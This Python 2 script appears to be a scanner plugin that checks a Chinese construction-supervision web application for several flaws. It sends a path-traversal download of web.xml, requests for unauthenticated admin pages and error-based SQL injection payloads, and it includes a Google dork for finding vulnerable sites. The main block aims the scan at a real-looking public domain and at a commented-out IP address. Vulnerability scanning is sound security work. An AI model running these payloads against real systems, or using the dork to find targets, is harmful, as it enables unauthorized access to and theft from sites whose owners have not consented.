#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 深蓝软件建筑工程质量安全监督系统漏洞打包
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-070106
description:
    打包
google dork:
    技术支持：绍兴市深蓝软件开发有限公司|
'''

def assign(service, arg):
    if service == 'shenlan_jiandu':
        return True, arg

def audit(arg):
    #任意文件下载
    url = arg + 'download.jsp?path=../WEB-INF/web.xml'
    code, head, res, err, _ = curl.curl2(url)
    if (code == 200) and ('<?xml' in res) and ('<web-app>' in res):
        security_hole('Arbitrary file download: ' + url)
    #后台未授权访问
    url = arg + 'houtai/main.jsp'
    code, head, res, err, _ = curl.curl2(url)
    #print res
    if(code == 200) and ('网站管理平台'.decode('utf-8').encode('gb2312') in res) and ('src="left.jsp"' in res):
        security_warning("Unauthorized access ::" + url)
    #未授权访问
    urls =[
        arg + 'houtai/zxzx.jsp?type=1',
        arg + 'houtai/bszn.jsp?type=1'
    ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if(code == 200) and ('发布日期'.decode('utf-8').encode('gb2312') in res):
            security_warning('Unauthorized access : ' + url)
    url = arg + 'houtai/yqlj.jsp'
    code, head, res, err, _ = curl.curl2(url)
    if(code == 200) and ('链接说明'.decode('utf-8').encode('gb2312') in res):
        security_warning('Unauthorized access :' + url)
    #SQL注入
    urls = [
        arg + 'houtai/masterfujian.jsp?rowno=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
        arg + 'houtai/modi.jsp?type=1&rowid=100%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
        ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if (code == 500) and ('WtFaBcMicrosoft SQL Server' in res):
            security_hole('SQL Injection: ' + url)
if __name__ == '__main__':
    from dummy import *
    #audit(assign('shenlan_jiandu', 'http://202.107.240.110/')[1])
    audit(assign('shenlan_jiandu', 'http://www.lqzjz.com.cn/')[1])